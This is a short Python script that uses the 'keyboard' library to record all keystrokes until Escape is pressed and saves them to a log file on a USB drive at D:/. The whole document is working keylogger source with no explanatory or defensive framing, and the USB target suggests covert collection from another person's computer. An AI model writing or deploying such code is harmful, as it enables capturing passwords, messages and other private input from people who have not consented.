import keyboard
to_write = ""
usb_drive_location = "D:/"

rk = keyboard.record(until="Esc")
for element in rk:
    to_write += str(element) + ","

open(usb_drive_location + "log.log", "w").write(to_write[:-1])
